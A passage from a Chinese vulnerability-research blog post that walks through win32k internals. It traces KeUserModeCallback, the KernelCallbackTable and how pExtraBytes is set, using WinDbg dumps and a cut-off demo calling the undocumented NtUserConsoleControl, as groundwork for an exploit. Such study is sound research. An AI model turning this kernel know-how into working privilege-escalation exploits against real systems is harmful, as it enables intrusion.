<p><img src="https://s2.loli.net/2023/04/10/gVATI56kfOzlpBb.png" alt="4.png"></p>
<p>进入win32kfull!xxxClientAllocWindowClassExtraBytes，其参数为申请大小的长度，通过观察代码可以发现，这个函数调用了KeUserModeCallback，这是回调函数，可以实现Ring0-&gt;Ring3-&gt;Ring0，也就是回到r3调用用户层的函数，然后得到返回值，回到r0。<br><img src="https://s2.loli.net/2023/04/10/FHKZoj2vdGAEbMR.png" alt="5.png"></p>
<p>这里学习下KeUserModeCallback的函数调用过程，其函数定义如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">KeUserModeCallback (</span><br><span class="line">    IN ULONG ApiNumber,					<span class="comment">//对应函数在KernelCallback表中的索引</span></span><br><span class="line">    IN PVOID InputBuffer,				<span class="comment">//ApiNumber不同（即调用的函数不同），此参数对应不同的结构</span></span><br><span class="line">    IN ULONG InputLength,</span><br><span class="line">    OUT PVOID *OutputBuffer,			        <span class="comment">//执行后输出的结果</span></span><br><span class="line">    IN PULONG OutputLength</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<p>这里的第一个参数决定了将调用什么函数，KernelCallback表可在peb中查看。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt _PEB @<span class="variable">$peb</span></span><br><span class="line">ntdll!_PEB</span><br><span class="line">   +0x000 InheritedAddressSpace : 0 <span class="string">&#x27;&#x27;</span></span><br><span class="line">   +0x001 ReadImageFileExecOptions : 0 <span class="string">&#x27;&#x27;</span></span><br><span class="line">   +0x002 BeingDebugged    : 0 <span class="string">&#x27;&#x27;</span></span><br><span class="line">   +0x003 BitField         : 0 <span class="string">&#x27;&#x27;</span></span><br><span class="line">   +0x003 ImageUsesLargePages : 0y0</span><br><span class="line">   +0x003 IsProtectedProcess : 0y0</span><br><span class="line">   +0x003 IsImageDynamicallyRelocated : 0y0</span><br><span class="line">   +0x003 SkipPatchingUser32Forwarders : 0y0</span><br><span class="line">   +0x003 IsPackagedProcess : 0y0</span><br><span class="line">   +0x003 IsAppContainer   : 0y0</span><br><span class="line">   +0x003 IsProtectedProcessLight : 0y0</span><br><span class="line">   +0x003 IsLongPathAwareProcess : 0y0</span><br><span class="line">   +0x004 Padding0         : [4]  <span class="string">&quot;&quot;</span></span><br><span class="line">   +0x008 Mutant           : 0xffffffff`ffffffff Void</span><br><span class="line">   +0x010 ImageBaseAddress : 0x00000001`40000000 Void</span><br><span class="line">   +0x018 Ldr              : 0x00007ffe`f1a453c0 _PEB_LDR_DATA</span><br><span class="line">   +0x020 ProcessParameters : 0x00000000`00471c40 _RTL_USER_PROCESS_PARAMETERS</span><br><span class="line">   +0x028 SubSystemData    : (null) </span><br><span class="line">   +0x030 ProcessHeap      : 0x00000000`00470000 Void</span><br><span class="line">   +0x038 FastPebLock      : 0x00007ffe`f1a44fe0 _RTL_CRITICAL_SECTION</span><br><span class="line">   +0x040 AtlThunkSListPtr : (null) </span><br><span class="line">   +0x048 IFEOKey          : (null) </span><br><span class="line">   +0x050 CrossProcessFlags : 0</span><br><span class="line">   +0x050 ProcessInJob     : 0y0</span><br><span class="line">   +0x050 ProcessInitializing : 0y0</span><br><span class="line">   +0x050 ProcessUsingVEH  : 0y0</span><br><span class="line">   +0x050 ProcessUsingVCH  : 0y0</span><br><span class="line">   +0x050 ProcessUsingFTH  : 0y0</span><br><span class="line">   +0x050 ProcessPreviouslyThrottled : 0y0</span><br><span class="line">   +0x050 ProcessCurrentlyThrottled : 0y0</span><br><span class="line">   +0x050 ProcessImagesHotPatched : 0y0</span><br><span class="line">   +0x050 ReservedBits0    : 0y000000000000000000000000 (0)</span><br><span class="line">   +0x054 Padding1         : [4]  <span class="string">&quot;&quot;</span></span><br><span class="line">   +0x058 KernelCallbackTable : 0x00007ffe`f02f7330 Void</span><br><span class="line">   +0x058 UserSharedInfoPtr : 0x00007ffe`f02f7330 Void</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1: kd&gt; dqs 0x00007ffe`f02f7330 L130</span><br><span class="line">00007ffe`f02f7330  00007ffe`f0275160 USER32!_fnCOPYDATA</span><br><span class="line">00007ffe`f02f7338  00007ffe`f02eec70 USER32!_fnCOPYGLOBALDATA</span><br><span class="line">00007ffe`f02f7340  00007ffe`f02928a0 USER32!_fnDWORD</span><br><span class="line">00007ffe`f02f7348  00007ffe`f0296350 USER32!_fnNCDESTROY</span><br><span class="line">00007ffe`f02f7350  00007ffe`f029c920 USER32!_fnDWORDOPTINLPMSG</span><br><span class="line">00007ffe`f02f7358  00007ffe`f02ef400 USER32!_fnINOUTDRAG</span><br><span class="line">00007ffe`f02f7360  00007ffe`f0297bc0 USER32!_fnGETTEXTLENGTHS</span><br><span class="line">00007ffe`f02f7368  00007ffe`f02ef0c0 USER32!_fnINCNTOUTSTRING</span><br><span class="line">00007ffe`f02f7370  00007ffe`f02ef180 USER32!_fnINCNTOUTSTRINGNULL</span><br><span class="line">00007ffe`f02f7378  00007ffe`f0299430 USER32!_fnINLPCOMPAREITEMSTRUCT</span><br><span class="line">00007ffe`f02f7380  00007ffe`f02949b0 USER32!__fnINLPCREATESTRUCT</span><br><span class="line">00007ffe`f02f7388  00007ffe`f02ef230 USER32!_fnINLPDELETEITEMSTRUCT</span><br><span class="line">00007ffe`f02f7390  00007ffe`f029ee90 USER32!__fnINLPDRAWITEMSTRUCT</span><br><span class="line">00007ffe`f02f7398  00007ffe`f02ef290 USER32!_fnINLPHELPINFOSTRUCT</span><br><span class="line">00007ffe`f02f73a0  00007ffe`f02ef290 USER32!_fnINLPHELPINFOSTRUCT</span><br><span class="line">00007ffe`f02f73a8  00007ffe`f02ef390 USER32!_fnINLPMDICREATESTRUCT</span><br><span class="line">00007ffe`f02f73b0  00007ffe`f029fbf0 USER32!_fnINOUTLPMEASUREITEMSTRUCT</span><br><span class="line">00007ffe`f02f73b8  00007ffe`f0295970 USER32!_fnINLPWINDOWPOS</span><br><span class="line">00007ffe`f02f73c0  00007ffe`f0294c90 USER32!_fnINOUTLPPOINT5</span><br><span class="line">00007ffe`f02f73c8  00007ffe`f02996c0 USER32!_fnINOUTLPSCROLLINFO</span><br><span class="line">00007ffe`f02f73d0  00007ffe`f0299df0 USER32!_fnINOUTLPRECT</span><br><span class="line">00007ffe`f02f73d8  00007ffe`f0295a30 USER32!_fnINOUTNCCALCSIZE</span><br><span class="line">00007ffe`f02f73e0  00007ffe`f0294c90 USER32!_fnINOUTLPPOINT5</span><br><span class="line">00007ffe`f02f73e8  00007ffe`f02ef4c0 USER32!_fnINPAINTCLIPBRD</span><br><span class="line">00007ffe`f02f73f0  00007ffe`f02ef580 USER32!_fnINSIZECLIPBRD</span><br><span class="line">00007ffe`f02f73f8  00007ffe`f02a0d80 USER32!_fnINDESTROYCLIPBRD</span><br><span class="line">00007ffe`f02f7400  00007ffe`f0271ed0 USER32!_fnINSTRING</span><br><span class="line">00007ffe`f02f7408  00007ffe`f0271ed0 USER32!_fnINSTRING</span><br><span class="line">00007ffe`f02f7410  00007ffe`f02a1230 USER32!__fnINDEVICECHANGE</span><br><span class="line">00007ffe`f02f7418  00007ffe`f02751e0 USER32!_fnPOWERBROADCAST</span><br><span class="line">00007ffe`f02f7420  00007ffe`f02960f0 USER32!_fnINLPUAHDRAWMENU</span><br><span class="line">00007ffe`f02f7428  00007ffe`f029ef00 USER32!_fnOPTOUTLPDWORDOPTOUTLPDWORD</span><br><span class="line">00007ffe`f02f7430  00007ffe`f029ef00 USER32!_fnOPTOUTLPDWORDOPTOUTLPDWORD</span><br><span class="line">00007ffe`f02f7438  00007ffe`f02ef680 USER32!_fnOUTDWORDINDWORD</span><br><span class="line">00007ffe`f02f7440  00007ffe`f029e870 USER32!_fnOUTLPRECT</span><br><span class="line">00007ffe`f02f7448  00007ffe`f02752e0 USER32!_fnOUTSTRING</span><br><span class="line">00007ffe`f02f7450  00007ffe`f02ef290 USER32!_fnINLPHELPINFOSTRUCT</span><br><span class="line">00007ffe`f02f7458  00007ffe`f02ef180 USER32!_fnINCNTOUTSTRINGNULL</span><br><span class="line">00007ffe`f02f7460  00007ffe`f02ef740 USER32!_fnSENTDDEMSG</span><br><span class="line">00007ffe`f02f7468  00007ffe`f0294790 USER32!_fnINOUTLPSIZE</span><br><span class="line">00007ffe`f02f7470  00007ffe`f0292900 USER32!_fnHkINDWORD</span><br><span class="line">00007ffe`f02f7478  00007ffe`f029fd80 USER32!_fnHkINLPCBTACTIVATESTRUCT</span><br><span class="line">00007ffe`f02f7480  00007ffe`f029e790 USER32!__fnHkINLPCBTCREATESTRUCT</span><br><span class="line">00007ffe`f02f7488  00007ffe`f02eedc0 USER32!_fnHkINLPDEBUGHOOKSTRUCT</span><br><span class="line">00007ffe`f02f7490  00007ffe`f0271720 USER32!_fnHkINLPMOUSEHOOKSTRUCTEX</span><br><span class="line">00007ffe`f02f7498  00007ffe`f02eee20 USER32!_fnHkINLPKBDLLHOOKSTRUCT</span><br><span class="line">00007ffe`f02f74a0  00007ffe`f02eee70 USER32!_fnHkINLPMSLLHOOKSTRUCT</span><br><span class="line">00007ffe`f02f74a8  00007ffe`f0292940 USER32!__fnHkINLPMSG</span><br><span class="line">00007ffe`f02f74b0  00007ffe`f02eeec0 USER32!_fnHkINLPRECT</span><br><span class="line">00007ffe`f02f74b8  00007ffe`f02eef10 USER32!_fnHkOPTINLPEVENTMSG</span><br><span class="line">00007ffe`f02f74c0  00007ffe`f02ef890 USER32!_xxxClientCallDelegateThread</span><br><span class="line">00007ffe`f02f74c8  00007ffe`f02ee500 USER32!_ClientCallDummyCallback</span><br><span class="line">00007ffe`f02f74d0  00007ffe`f02ef620 USER32!_fnKEYBOARDCORRECTIONCALLOUT</span><br><span class="line">00007ffe`f02f74d8  00007ffe`f0296200 USER32!_fnOUTLPCOMBOBOXINFO</span><br><span class="line">00007ffe`f02f74e0  00007ffe`f0299430 USER32!_fnINLPCOMPAREITEMSTRUCT</span><br><span class="line">00007ffe`f02f74e8  00007ffe`f02ee500 USER32!_ClientCallDummyCallback</span><br><span class="line">00007ffe`f02f74f0  00007ffe`f02961b0 USER32!_xxxClientCallDitThread</span><br><span class="line">00007ffe`f02f74f8  00007ffe`f029f9f0 USER32!_xxxClientEnableMMCSS</span><br><span class="line">00007ffe`f02f7500  00007ffe`f02ef9d0 USER32!_xxxClientUpdateDpi</span><br><span class="line">00007ffe`f02f7508  00007ffe`f0274e00 USER32!_xxxClientExpandStringW</span><br><span class="line">00007ffe`f02f7510  00007ffe`f02ee670 USER32!_ClientCopyDDEIn1</span><br><span class="line">00007ffe`f02f7518  00007ffe`f02ee6f0 USER32!_ClientCopyDDEIn2</span><br><span class="line">00007ffe`f02f7520  00007ffe`f02ee770 USER32!_ClientCopyDDEOut1</span><br><span class="line">00007ffe`f02f7528  00007ffe`f02ee7b0 USER32!_ClientCopyDDEOut2</span><br><span class="line">00007ffe`f02f7530  00007ffe`f02760c0 USER32!_ClientCopyImage</span><br><span class="line">00007ffe`f02f7538  00007ffe`f02ee810 USER32!_ClientEventCallback</span><br><span class="line">00007ffe`f02f7540  00007ffe`f02ee870 USER32!_ClientFindMnemChar</span><br><span class="line">00007ffe`f02f7548  00007ffe`f02ee8d0 USER32!_ClientFreeDDEHandle</span><br><span class="line">00007ffe`f02f7550  00007ffe`f029a350 USER32!__ClientFreeLibrary</span><br><span class="line">00007ffe`f02f7558  00007ffe`f029b810 USER32!_ClientGetCharsetInfo</span><br><span class="line">00007ffe`f02f7560  00007ffe`f02ee910 USER32!_ClientGetDDEFlags</span><br><span class="line">00007ffe`f02f7568  00007ffe`f02ee990 USER32!_ClientGetDDEHookData</span><br><span class="line">00007ffe`f02f7570  00007ffe`f029f920 USER32!_ClientGetListboxString</span><br><span class="line">00007ffe`f02f7578  00007ffe`f0294b50 USER32!_ClientGetMessageMPH</span><br><span class="line">00007ffe`f02f7580  00007ffe`f0276110 USER32!__ClientLoadImage</span><br><span class="line">00007ffe`f02f7588  00007ffe`f0275390 USER32!_ClientLoadLibrary</span><br><span class="line">00007ffe`f02f7590  00007ffe`f02737f0 USER32!_ClientLoadMenu</span><br><span class="line">00007ffe`f02f7598  00007ffe`f029bbd0 USER32!_ClientLoadLocalT1Fonts</span><br><span class="line">00007ffe`f02f75a0  00007ffe`f02eeb10 USER32!_ClientPSMTextOut</span><br><span class="line">00007ffe`f02f75a8  00007ffe`f02ee9e0 USER32!_ClientLpkDrawTextEx</span><br><span class="line">00007ffe`f02f75b0  00007ffe`f02a1470 USER32!_ClientExtTextOutW</span><br><span class="line">00007ffe`f02f75b8  00007ffe`f02a1500 USER32!_ClientGetTextExtentPointW</span><br><span class="line">00007ffe`f02f75c0  00007ffe`f02ee5f0 USER32!_ClientCharToWchar</span><br><span class="line">00007ffe`f02f75c8  00007ffe`f0275500 USER32!_ClientAddFontResourceW</span><br><span class="line">00007ffe`f02f75d0  00007ffe`f028f120 USER32!_ClientThreadSetup</span><br><span class="line">00007ffe`f02f75d8  00007ffe`f02ee7f0 USER32!_ClientDeliverUserApc</span><br><span class="line">00007ffe`f02f75e0  00007ffe`f02eea80 USER32!_ClientNoMemoryPopup</span><br><span class="line">00007ffe`f02f75e8  00007ffe`f0297ff0 USER32!_ClientMonitorEnumProc</span><br><span class="line">00007ffe`f02f75f0  00007ffe`f0296150 USER32!_ClientCallWinEventProc</span><br><span class="line">00007ffe`f02f75f8  00007ffe`f029ca70 USER32!_ClientWaitMessageExMPH</span><br><span class="line">00007ffe`f02f7600  00007ffe`f0297fc0 USER32!_ClientWOWGetProcModule</span><br><span class="line">00007ffe`f02f7608  00007ffe`f02eec10 USER32!_ClientWOWTask16SchedNotify</span><br><span class="line">00007ffe`f02f7610  00007ffe`f029ba90 USER32!_ClientImmLoadLayout</span><br><span class="line">00007ffe`f02f7618  00007ffe`f0298310 USER32!_ClientImmProcessKey</span><br><span class="line">00007ffe`f02f7620  00007ffe`f02eefe0 USER32!_fnIMECONTROL</span><br><span class="line">00007ffe`f02f7628  00007ffe`f02a0cd0 USER32!__fnINWPARAMDBCSCHAR</span><br><span class="line">00007ffe`f02f7630  00007ffe`f0297bc0 USER32!_fnGETTEXTLENGTHS</span><br><span class="line">00007ffe`f02f7638  00007ffe`f02ef300 USER32!_fnINLPKDRAWSWITCHWND</span><br><span class="line">00007ffe`f02f7640  00007ffe`f02750b0 USER32!_ClientLoadStringW</span><br><span class="line">00007ffe`f02f7648  00007ffe`f02df7c0 USER32!_ClientLoadOLE</span><br><span class="line">00007ffe`f02f7650  00007ffe`f02df800 USER32!_ClientRegisterDragDrop</span><br><span class="line">00007ffe`f02f7658  00007ffe`f02df880 USER32!_ClientRevokeDragDrop</span><br><span class="line">00007ffe`f02f7660  00007ffe`f02ef460 USER32!_fnINOUTMENUGETOBJECT</span><br><span class="line">00007ffe`f02f7668  00007ffe`f0298cb0 USER32!__ClientPrinterThunk</span><br><span class="line">00007ffe`f02f7670  00007ffe`f0296200 USER32!_fnOUTLPCOMBOBOXINFO</span><br><span class="line">00007ffe`f02f7678  00007ffe`f02ef6e0 USER32!_fnOUTLPSCROLLBARINFO</span><br><span class="line">00007ffe`f02f7680  00007ffe`f02960f0 USER32!_fnINLPUAHDRAWMENU</span><br><span class="line">00007ffe`f02f7688  00007ffe`f0295900 USER32!__fnINLPUAHDRAWMENUITEM</span><br><span class="line">00007ffe`f02f7690  00007ffe`f02960f0 USER32!_fnINLPUAHDRAWMENU</span><br><span class="line">00007ffe`f02f7698  00007ffe`f02999f0 USER32!_fnINOUTLPUAHMEASUREMENUITEM</span><br><span class="line">00007ffe`f02f76a0  00007ffe`f02960f0 USER32!_fnINLPUAHDRAWMENU</span><br><span class="line">00007ffe`f02f76a8  00007ffe`f029b3e0 USER32!_fnOUTLPTITLEBARINFOEX</span><br><span class="line">00007ffe`f02f76b0  00007ffe`f02ef7d0 USER32!_fnTOUCH</span><br><span class="line">00007ffe`f02f76b8  00007ffe`f02eed00 USER32!_fnGESTURE</span><br><span class="line">00007ffe`f02f76c0  00007ffe`f02ef290 USER32!_fnINLPHELPINFOSTRUCT</span><br><span class="line">00007ffe`f02f76c8  00007ffe`f02ef290 USER32!_fnINLPHELPINFOSTRUCT</span><br><span class="line">00007ffe`f02f76d0  00007ffe`f02ef840 USER32!_xxxClientCallDefaultInputHandler</span><br><span class="line">00007ffe`f02f76d8  00007ffe`f0296a40 USER32!_fnEMPTY</span><br><span class="line">00007ffe`f02f76e0  00007ffe`f02eeb90 USER32!_ClientRimDevCallback</span><br><span class="line">00007ffe`f02f76e8  00007ffe`f02ef970 USER32!_xxxClientCallMinTouchHitTestingCallback</span><br><span class="line">00007ffe`f02f76f0  00007ffe`f02ee580 USER32!_ClientCallLocalMouseHooks</span><br><span class="line">00007ffe`f02f76f8  00007ffe`f028b3a0 USER32!__xxxClientBroadcastThemeChange</span><br><span class="line">00007ffe`f02f7700  00007ffe`f02ef910 USER32!_xxxClientCallDevCallbackSimple</span><br><span class="line">00007ffe`f02f7708  00007ffe`f02976b0 USER32!_xxxClientAllocWindowClassExtraBytes</span><br><span class="line">00007ffe`f02f7710  00007ffe`f0297f30 USER32!_xxxClientFreeWindowClassExtraBytes</span><br><span class="line">00007ffe`f02f7718  00007ffe`f02eed70 USER32!_fnGETWINDOWDATA</span><br><span class="line">00007ffe`f02f7720  00007ffe`f0294790 USER32!_fnINOUTLPSIZE</span><br><span class="line">00007ffe`f02f7728  00007ffe`f0271720 USER32!_fnHkINLPMOUSEHOOKSTRUCTEX</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到123代表的函数就是USER32!_xxxClientAllocWindowClassExtraBytes，我们去User32查看这个函数。</p>
<p><img src="https://s2.loli.net/2023/04/10/CAW6JVh7xpebfgz.png" alt="6.png"></p>
<p>可以发现，其在用户层申请了cbWndExtra对应的大小值，然后调用ntdll!NtCallbackReturn值回到内核层继续执行，申请的空间会返回到v7变量，然后一步步取值，最终执行完xxxClientAllocWindowClassExtraBytes这个函数，我们查看执行完后的rax，其会赋值到ptagWND -&gt; ptagWNDk -&gt; pExtraBytes。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; p</span><br><span class="line">win32kfull!xxxClientAllocWindowClassExtraBytes+<span class="number">0x114</span>:</span><br><span class="line">fffff285`<span class="number">828516</span>c0 c3              ret</span><br><span class="line"><span class="number">1</span>: kd&gt; p</span><br><span class="line">win32kfull!xxxCreateWindowEx+<span class="number">0x1259</span>:</span><br><span class="line">fffff285`<span class="number">8283</span>ce09 <span class="number">488b</span>c8          mov     rcx,rax</span><br><span class="line"><span class="number">1</span>: kd&gt; r rax</span><br><span class="line">rax=<span class="number">00000000004789</span>a0</span><br><span class="line"><span class="number">1</span>: kd&gt; dd rax</span><br><span class="line"><span class="number">00000000</span>`<span class="number">004789</span>a0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span>`<span class="number">004789b</span>0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">8e0</span>db23b <span class="number">80000865</span></span><br><span class="line"><span class="number">00000000</span>`<span class="number">004789</span>c0  <span class="number">3</span>d293638 <span class="number">505</span>c3a43 <span class="number">72676f</span>72 <span class="number">46206</span>d61</span><br><span class="line"><span class="number">00000000</span>`<span class="number">004789</span>d0  <span class="number">73656</span>c69 <span class="number">38782820</span> <span class="number">8e0</span>fb23d <span class="number">8000096f</span></span><br><span class="line"><span class="number">00000000</span>`<span class="number">004789e0</span>  <span class="number">6946206</span>e <span class="number">0073656</span>c <span class="number">6</span>d6d6f43 <span class="number">72506e6</span>f</span><br><span class="line"><span class="number">00000000</span>`<span class="number">004789f</span>0  <span class="number">6172676f</span> <span class="number">3436576</span>d <span class="number">8e01</span>b23f <span class="number">90000</span>a3a</span><br><span class="line"><span class="number">00000000</span>`<span class="number">00478</span>a00  <span class="number">6172676f</span> <span class="number">6946206</span>d <span class="number">00478810</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span>`<span class="number">00478</span>a10  <span class="number">46206e6</span>f <span class="number">73656</span>c69 <span class="number">8e03</span>b201 <span class="number">90000b</span>50</span><br></pre></td></tr></table></figure>

<p>赋值给ptagWND -&gt; ptagWNDk -&gt; pExtraBytes。</p>
<p><img src="https://s2.loli.net/2023/04/10/54bra1eWcvmFOVM.png" alt="7.png"></p>
<p>以上就是CreateWindowsEx申请额外内存的过程了，这对后面理解漏洞原理，以及exp编写有帮助。</p>
<h4 id="user32-ConsoleControl调试"><a href="#user32-ConsoleControl调试" class="headerlink" title="user32!ConsoleControl调试"></a>user32!ConsoleControl调试</h4><p>其实除了上面的方法可以对pExtraBytes进行赋值，还可以通过user32!ConsoleControl来对pExtraBytes进行赋值，函数调用链为，user32!ConsoleControl-&gt;win32kfull!NtUserConsoleControl-&gt;win32kfull!xxxConsoleControl。</p>
<p>由于这个函数并未公开，需要自己获取下函数地址进行调用，这里编写个demo。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD64</span><span class="params">(NTAPI* fnNtUserConsoleControl)</span><span class="params">(<span class="keyword">int</span> nConsoleCommand, HWND* pHwnd, <span class="keyword">int</span> nConsoleInformationLength)</span></span>;</span><br><span class="line"></span><br><span class="line">fnNtUserConsoleControl g_pfnNtUserConsoleControl = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 窗口类的窗口过程函数(负责消息处理) */</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">MyWndProc</span><span class="params">(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> DefWindowProc(hWnd, message, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 程序入口点 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(_In_ HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="function"><span class="params">    _In_opt_ HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="function"><span class="params">    _In_ LPSTR     lpCmdLine,</span></span></span><br><span class="line"><span class="function"><span class="params">    _In_ <span class="keyword">int</span>       nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HWND hwnd;</span><br><span class="line">    MSG msg;</span><br><span class="line">    WNDCLASSEX wndclass = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    wndclass.cbSize = <span class="keyword">sizeof</span>(WNDCLASSEX);</span><br><span class="line">    wndclass.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">    wndclass.lpfnWndProc = MyWndProc;</span><br><span class="line">    wndclass.hInstance = hInstance;</span><br><span class="line">    wndclass.lpszClassName = (LPWSTR)<span class="string">L&quot;Itach1&quot;</span>;</span><br><span class="line">    <span class="comment">/* 使用 cbWndExtra 字段，设置扩展内存大小为两个 long long */</span></span><br><span class="line">    wndclass.cbWndExtra = <span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>);</span><br><span class="line"></span><br><span class="line">    RegisterClassEx(&amp;wndclass);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    hwnd = CreateWindowEx(</span><br><span class="line">        <span class="literal">NULL</span>, <span class="string">L&quot;Itach1&quot;</span>, <span class="string">L&quot;Itach1&quot;</span>,</span><br><span class="line">        WS_OVERLAPPEDWINDOW | WS_VISIBLE,</span><br><span class="line">        CW_USEDEFAULT, CW_USEDEFAULT,</span><br><span class="line">        CW_USEDEFAULT, CW_USEDEFAULT,</span><br><span class="line">        <span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    g_pfnNtUserConsoleControl = (fnNtUserConsoleControl)GetProcAddress(GetModuleHandleA(<span class="string">&quot;win32u.dll&quot;</span>), <span 